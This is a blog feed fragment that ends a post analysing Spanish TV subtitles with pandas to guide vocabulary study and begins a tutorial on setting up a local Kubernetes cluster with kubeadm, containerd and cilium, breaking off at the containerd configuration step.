<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">p_df = pd.DataFrame(percentages.items(), columns=['show', 'percentage'])</span></span>
<span data-line=""><span style="color: #adbac7">p_df = p_df.sort_values(by='percentage')</span></span>
<span data-line=""><span style="color: #adbac7">p_df['percentage'] = p_df['percentage'] * 100</span></span>
<span data-line=""><span style="color: #adbac7">pd.options.display.float_format = '{:,.2f}%'.format</span></span>
<span data-line=""><span style="color: #adbac7">p_df</span></span></code></pre></div>




















<table>
<tbody><tr>
<th>Show</th>
<th>Percentage</th>
</tr><tr>
<td>Verónica</td>
<td>64.24%</td>
</tr><tr>
<td>El ciudadano ilustre</td>
<td>65.28%</td>
</tr><tr>
<td>El Chapo</td>
<td>66.68%</td>
</tr><tr>
<td>Neruda</td>
<td>66.89%</td>
</tr><tr>
<td>La casa de papel</td>
<td>67.56%</td>
</tr><tr>
<td>El Ministerio del Tiempo</td>
<td>68.03%</td>
</tr><tr>
<td>Club de Cuervos</td>
<td>68.19%</td>
</tr><tr>
<td>El marginal</td>
<td>68.47%</td>
</tr><tr>
<td>Ingobernable</td>
<td>68.59%</td>
</tr><tr>
<td>Pablo Escobar</td>
<td>70.20%</td>
</tr><tr>
<td>Fariña</td>
<td>70.95</td>
</tr><tr>
<td>La Reina del Sur</td>
<td>71.52%</td>
</tr><tr>
<td>Gran Hotel</td>
<td>73.15%</td>
</tr><tr>
<td>Las chicas del cable</td>
<td>73.58%</td>
</tr><tr>
<td>Élite</td>
<td>73.78%</td>
</tr><tr>
<td>La Piloto</td>
<td>74.03%</td>
</tr><tr>
<td>El bar</td>
<td>74.07%</td>
</tr><tr>
<td>La casa de las flores</td>
<td>75.40%</td>
</tr><tr>
<td>Tarde para la ira</td>
<td>75.59%</td>
</tr></tbody></table>
<p>But living in Puerto Rico, one thing I've realized is speed of speech is also important.  I have a much easier time speaking with people from Colombia and Mexico than I do with Puerto Ricans because they speak so much faster.   So even though I could understand 75% of "Tarde para la ira" if I learned the 200 words, I want to make sure they are speaking at a pace I could understand as well.</p>
<p>So I loaded up the other CSV file that was the full sentences and added a "time per word" column:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">sentences = pd.read_csv('sentences.csv.gz', compression='gzip', delimiter=',', parse_dates=['start', 'end'])</span></span>
<span data-line=""><span style="color: #adbac7">sentences['total_time'] = (sentences['end'] - sentences['start']).dt.total_seconds()</span></span>
<span data-line=""><span style="color: #adbac7">sentences['word_count'] = sentences['sentence'].str.split().str.len()</span></span>
<span data-line=""><span style="color: #adbac7">sentences['time_per_word'] = sentences['total_time'] / sentences['word_count']</span></span></code></pre></div>
<p>Then I was able to have a speed rating for each show:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">sentence_group = sentences.groupby([sentences.media])</span></span>
<span data-line=""><span style="color: #adbac7">sentence_group.time_per_word.mean().reset_index().sort_values('time_per_word')</span></span></code></pre></div>




















<table>
<tbody><tr>
<th>media</th>
<th>time_per_word</th>
</tr><tr>
<td>Gran Hotel</td>
<td>0.58</td>
</tr><tr>
<td>El Chapo</td>
<td>0.59</td>
</tr><tr>
<td>Las chicas del cable</td>
<td>0.61</td>
</tr><tr>
<td>Élite</td>
<td>0.63</td>
</tr><tr>
<td>Ingobernable</td>
<td>0.64</td>
</tr><tr>
<td>El Ministerio del Tiempo</td>
<td>0.64</td>
</tr><tr>
<td>Fariña</td>
<td>0.65</td>
</tr><tr>
<td>El ciudadano ilustre</td>
<td>0.67</td>
</tr><tr>
<td>Neruda</td>
<td>0.68</td>
</tr><tr>
<td>La Piloto</td>
<td>0.69</td>
</tr><tr>
<td>La casa de papel</td>
<td>0.70</td>
</tr><tr>
<td>El bar</td>
<td>0.70</td>
</tr><tr>
<td>Verónica</td>
<td>0.72</td>
</tr><tr>
<td>La Reina del Sur</td>
<td>0.75</td>
</tr><tr>
<td>Club de Cuervos</td>
<td>0.76</td>
</tr><tr>
<td>El marginal</td>
<td>0.76</td>
</tr><tr>
<td>Pablo Escobar</td>
<td>0.77</td>
</tr><tr>
<td>Tarde para la ira</td>
<td>0.77</td>
</tr><tr>
<td>La casa de las flores</td>
<td>0.81</td>
</tr></tbody></table>
<p>Luckily the two series that have the least amount of vocabulary also speak the slowest!   So these will be the series I start with.    The final question I wanted to answer is "What are the top words I'm missing for a series".    Since I'll know 75% of the series from the top 200 words, I'm hoping there are some top words from a specific series that I can also learn to get an even higher understanding.</p>
<p>First, find which words are in each show but not in the top 200:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">missing_words_by_show = {}</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">for show_name in words['media'].drop_duplicates().values:</span></span>
<span data-line=""><span style="color: #adbac7">    words_in_show = (words[words.media == show_name].groupby(words.word).size() </span></span>
<span data-line=""><span style="color: #adbac7">       .sort_values(ascending=False) </span></span>
<span data-line=""><span style="color: #adbac7">       .reset_index(name='count')</span></span>
<span data-line=""><span style="color: #adbac7">       .drop_duplicates(subset='word'))</span></span>
<span data-line=""><span style="color: #adbac7">    </span></span>
<span data-line=""><span style="color: #adbac7">    frequency_words = grouped_result['word'][:200]</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">    missing_words = words_in_show[~words_in_show.word.isin(frequency_words.values)]</span></span>
<span data-line=""><span style="color: #adbac7">    missing_words_by_show[show_name] = missing_words</span></span></code></pre></div>
<p>Then we were able to grab them per show:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">missing_words_by_show['La casa de las flores'].head(50)</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">word	count</span></span>
<span data-line=""><span style="color: #adbac7">31	mamá	252</span></span>
<span data-line=""><span style="color: #adbac7">70	florería	87</span></span>
<span data-line=""><span style="color: #adbac7">98	perdón	56</span></span>
<span data-line=""><span style="color: #adbac7">102	sea	54</span></span>
<span data-line=""><span style="color: #adbac7">116	además	44</span></span>
<span data-line=""><span style="color: #adbac7">126	ahorita	40</span></span>
<span data-line=""><span style="color: #adbac7">132	cárcel	38</span></span>
<span data-line=""><span style="color: #adbac7">133	fiesta	38</span></span></code></pre></div>
<p>So adding those few words to my vocabulary will also give me a better understanding of the series.</p>
<h2>Conclusion</h2>
<p>I believe a data-driven approach to language learning will be an effective way to get me speaking better spanish.   It was a ton of fun to play with spaCy, pandas, and jupyter as well!</p>
<p>I'll improve the data analysis over time as well but I do believe this is a pretty good starting point!</p>
<center>
<img src="/images/posts/learning_spanish/meme.png">
</center>]]></description>
            <link>https://sontek.net/blog/2022/learning_spanish</link>
            <guid isPermaLink="true">https://sontek.net/blog/2022/learning_spanish</guid>
            <pubDate>Sat, 30 Apr 2022 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[Running a kubernetes cluster locally with kubeadm]]></title>
            <description><![CDATA[<p>I’m going to show you how to get a real kubernetes cluster setup locally on top of virtual
machines!  I’ll be using multipass but feel free to use virtualbox, proxmox, or whatever your
favorite cloud provider is.</p>
<p>kubeadm a production ready kubernetes install tool and I prefer to use it over minikube, kind,
etc. because it gives you a more real world experience for <em>managing</em> the kubernetes cluster.
This isn’t important if you are a user of the cluster but if you have to run your own this is
a great way to gain some daily experience.</p>
<p>The kubernetes documentation on kubeadm is great and you can find it <a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/">here</a>.</p>
<p>The differences between this blog and the kubernetes docs is that they leave a lot of decisions
up to the reader such as:</p>
<ul>
<li>choosing a container runtime</li>
<li>Selecting and installing a CNI (container network interface)</li>
</ul>
<p>I’m going to be opinionated and make specific technology decisions such as using containerd and
cilium so that you don't have to think about those decisions.</p>
<h2>Getting your Virtual Machines setup!</h2>
<p>The minimum requirements for a control plane node in kubernetes is 2gb of RAM and 2 CPUs.  Since
we actually want to be able to schedule workloads on the workers afterwards we are going to setup
a cluster that looks like this:</p>
<ul>
<li>Control Plane: 2gb RAM, 2 CPU</li>
<li>Worker: 4gb RAM, 2 CPU</li>
</ul>
<p>Since we’ll be using multipass to launch the nodes, we can do that now:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">multipass</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">launch</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-c</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">2</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-m</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">4</span><span style="color: #96D0FF">G</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">10</span><span style="color: #96D0FF">G</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-n</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">controlplane</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">22.04</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">multipass</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">launch</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-c</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">2</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-m</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">4</span><span style="color: #96D0FF">G</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">10</span><span style="color: #96D0FF">G</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-n</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">worker</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">22.04</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">multipass</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list</span></span>
<span data-line=""><span style="color: #F69D50">Name</span><span style="color: #ADBAC7">                    </span><span style="color: #96D0FF">State</span><span style="color: #ADBAC7">             </span><span style="color: #96D0FF">IPv4</span><span style="color: #ADBAC7">             </span><span style="color: #96D0FF">Image</span></span>
<span data-line=""><span style="color: #F69D50">controlplane</span><span style="color: #ADBAC7">            </span><span style="color: #96D0FF">Running</span><span style="color: #ADBAC7">           </span><span style="color: #6CB6FF">192.168</span><span style="color: #96D0FF">.64.7</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Ubuntu</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">22.04</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">LTS</span></span>
<span data-line=""><span style="color: #F69D50">worker</span><span style="color: #ADBAC7">                  </span><span style="color: #96D0FF">Running</span><span style="color: #ADBAC7">           </span><span style="color: #6CB6FF">192.168</span><span style="color: #96D0FF">.64.8</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Ubuntu</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">22.04</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">LTS</span></span></code></pre></div>
<p>Now we can start working on our controlplane first, lets shell in:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">multipass</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">shell</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">controlplane</span></span></code></pre></div>
<p>Lets first add the kubernetes repo to the system so we have access to all the kubernetes tools:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">echo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"deb  http://apt.kubernetes.io/  kubernetes-xenial  main"</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">tee</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/apt/sources.list.d/kubernetes.list</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-fsSL</span><span style="color: #ADBAC7">  </span><span style="color: #96D0FF">https://packages.cloud.google.com/apt/doc/apt-key.gpg</span><span style="color: #F47067">|</span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">gpg</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--dearmor</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/apt/trusted.gpg.d/k8s.gpg</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">update</span><span style="color: #ADBAC7"> &#x26;&#x26; </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">upgrade</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-y</span></span></code></pre></div>
<p>Now that our system is setup, we can move on to getting a container runtime.</p>
<h2>Getting your Container Runtime!</h2>
<p>Before we start pulling in kubernetes components we need to get a container runtime setup on the
machine.   We we are going to use containerd for this purpose.  You can view the docs of for it
<a href="https://github.com/containerd/containerd/blob/main/docs/getting-started.md">here</a>.</p>
<p>Which will download the latest binary and set it up.   I’m going to walk you through how to do it
using the version packaged with Ubuntu which could be older than the latest release.</p>
<p>First thing we want to do is configure the networking to allow iptables to manage:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cat</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">&#x3C;&#x3C;</span><span style="color: #ADBAC7">EOF</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> sudo tee /etc/modules-load.d/k8s.conf</span></span>
<span data-line=""><span style="color: #96D0FF">overlay</span></span>
<span data-line=""><span style="color: #96D0FF">br_netfilter</span></span>
<span data-line=""><span style="color: #ADBAC7">EOF</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cat</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">&#x3C;&#x3C;</span><span style="color: #ADBAC7">EOF</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> sudo tee /etc/sysctl.d/k8s.conf</span></span>
<span data-line=""><span style="color: #96D0FF">net.bridge.bridge-nf-call-ip6tables = 1</span></span>
<span data-line=""><span style="color: #96D0FF">net.bridge.bridge-nf-call-iptables  = 1</span></span>
<span data-line=""><span style="color: #96D0FF">net.ipv4.ip_forward                 = 1</span></span>
<span data-line=""><span style="color: #ADBAC7">EOF</span></span>
<span data-line=""> </span></code></pre></div>
<p>We also need to disable some default systemd settings for <code>rp_filter</code>  because
they are not compatible with cilium. See the bug report
<a href="https://github.com/cilium/cilium/commit/cabc6581b8128681f4ed23f8d6dc463180eea61e">here</a></p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sed</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-i</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-e</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'/net.ipv4.conf.*.rp_filter/d'</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">$(</span><span style="color: #F69D50">grep</span><span style="color: #96D0FF"> </span><span style="color: #6CB6FF">-ril</span><span style="color: #96D0FF"> '\.rp_filter' /etc/sysctl.d/ /usr/lib/sysctl.d/)</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sysctl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-a</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">grep</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'\.rp_filter'</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">awk</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'{print $1" = 0"}'</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">tee</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-a</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/sysctl.d/1000-cilium.conf</span></span></code></pre></div>
<p>Then we need to refresh sysctl so those settings are applied:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">systemctl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">restart</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">systemd-modules-load</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sysctl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--system</span></span></code></pre></div>
<p>You should see it applying all the changes:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">* Applying /etc/sysctl.d/k8s.conf ...</span></span>
<span data-line=""><span style="color: #adbac7">net.bridge.bridge-nf-call-ip6tables = 1</span></span>
<span data-line=""><span style="color: #adbac7">net.bridge.bridge-nf-call-iptables = 1</span></span>
<span data-line=""><span style="color: #adbac7">net.ipv4.ip_forward = 1</span></span></code></pre></div>
<p>If you do not, the netfilter module may not have loaded properly:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">lsmod</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #F69D50">grep</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">br_netfilter</span></span>
<span data-line=""><span style="color: #F69D50">br_netfilter</span><span style="color: #ADBAC7">           </span><span style="color: #6CB6FF">28672</span><span style="color: #ADBAC7">  </span><span style="color: #6CB6FF">0</span></span>
<span data-line=""><span style="color: #F69D50">bridge</span><span style="color: #ADBAC7">                </span><span style="color: #6CB6FF">176128</span><span style="color: #ADBAC7">  </span><span style="color: #6CB6FF">1</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">br_netfilter</span></span></code></pre></div>
<p>You want to make sure <code>rp_filter</code> is <code>0</code> everywhere as well for cilium:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">❯ sudo sysctl -a | grep '\.rp_filter'</span></span>
<span data-line=""><span style="color: #adbac7">net.ipv4.conf.all.rp_filter = 0</span></span>
<span data-line=""><span style="color: #adbac7">net.ipv4.conf.cilium_host.rp_filter = 0</span></span>
<span data-line=""><span style="color: #adbac7">net.ipv4.conf.cilium_net.rp_filter = 0</span></span>
<span data-line=""><span style="color: #adbac7">net.ipv4.conf.cilium_vxlan.rp_filter = 0</span></span>
<span data-line=""><span style="color: #adbac7">net.ipv4.conf.default.rp_filter = 0</span></span>
<span data-line=""><span style="color: #adbac7">net.ipv4.conf.enp0s1.rp_filter = 0</span></span>
<span data-line=""><span style="color: #adbac7">net.ipv4.conf.lo.rp_filter = 0</span></span>
<span data-line=""><span style="color: #adbac7">net.ipv4.conf.lxc0965b7b545f7.rp_filter = 0</span></span>
<span data-line=""><span style="color: #adbac7">net.ipv4.conf.lxcb05ffd84ab74.rp_filter = 0</span></span></code></pre></div>
<p>Now lets pull down the container runtime we’ll be using which is containerd.</p>
<p>Ubuntu ships with a very old version of containerd so you need to upgrade to
the version shipped from the docker repos:
You can find which versions are available by running:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-fsSL</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">https://download.docker.com/linux/ubuntu/gpg</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">gpg</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--dearmor</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/apt/trusted.gpg.d/docker.gpg</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">echo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"deb https://download.docker.com/linux/ubuntu $(</span><span style="color: #F69D50">lsb_release</span><span style="color: #96D0FF"> </span><span style="color: #6CB6FF">-cs</span><span style="color: #96D0FF">) stable"</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">tee</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/apt/sources.list.d/docker.list</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">update</span></span></code></pre></div>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-cache</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">madison</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">containerd.io</span></span>
<span data-line=""><span style="color: #F69D50">containerd.io</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7">    </span><span style="color: #F69D50">1.6.8-1</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">https://download.docker.com/linux/ubuntu</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">jammy/stable</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arm64</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Packages</span></span>
<span data-line=""><span style="color: #F69D50">containerd.io</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7">    </span><span style="color: #F69D50">1.6.7-1</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">https://download.docker.com/linux/ubuntu</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">jammy/stable</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arm64</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Packages</span></span>
<span data-line=""><span style="color: #F69D50">containerd.io</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7">    </span><span style="color: #F69D50">1.6.6-1</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">https://download.docker.com/linux/ubuntu</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">jammy/stable</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arm64</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Packages</span></span>
<span data-line=""><span style="color: #F69D50">containerd.io</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7">    </span><span style="color: #F69D50">1.6.4-1</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">https://download.docker.com/linux/ubuntu</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">jammy/stable</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arm64</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Packages</span></span>
<span data-line=""><span style="color: #F69D50">containerd.io</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7">   </span><span style="color: #F69D50">1.5.11-1</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">https://download.docker.com/linux/ubuntu</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">jammy/stable</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arm64</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Packages</span></span>
<span data-line=""><span style="color: #F69D50">containerd.io</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7">   </span><span style="color: #F69D50">1.5.10-1</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">https://download.docker.com/linux/ubuntu</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">jammy/stable</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arm64</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Packages</span></span></code></pre></div>
<p>We are going to use the latest version available which was 1.6.8-1</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">containerd.io=</span><span style="color: #6CB6FF">1.6</span><span style="color: #96D0FF">.8-1</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-y</span></span></code></pre></div>
<p>Then we'll setup a configuration that enables containerd to use the systemd
cgroup.  We are hard coding this config instead of using <code>containerd config default</code>
because that currently has had a <a href="https://github.com/containerd/containerd/issues/4574">bug</a>
for many years that generates an invalid config.</p>
